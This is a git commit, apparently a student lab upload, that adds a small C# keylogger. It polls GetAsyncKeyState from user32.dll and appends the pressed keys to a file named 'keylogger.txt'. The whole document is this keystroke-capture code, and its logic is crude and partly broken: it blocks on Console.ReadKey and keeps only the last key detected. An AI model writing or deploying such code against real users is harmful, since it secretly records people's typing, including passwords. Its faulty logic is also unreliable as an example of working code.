4df3fb1eede9781ed64ffb94c134afa533214bfc
dotMSP <79195263+dotMSP@users.noreply.github.com>
2021-05-14 20:57:13 +0300

    Add files via upload

---
+++ Lab4_1/Lab4_1/Program.cs
@@ -0,0 +1,33 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+
+namespace Lab4
+{
+    class Program
+    {
+        [DllImport("user32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+        static void Main()
+        {
+
+            while (true)
+            {
+
+                StreamWriter log = new StreamWriter("keylogger.txt", true);
+                char key = ' ';
+                for (int i = 0; i < 100; i++)
+                {
+                    if (GetAsyncKeyState(i) != 0)
+                    {
+                        key = Convert.ToChar(i);
+                    }
+                }
+                log.Write(key);
+                Console.ReadKey();
+                log.Close();
+            }
+        }
+    }
+}
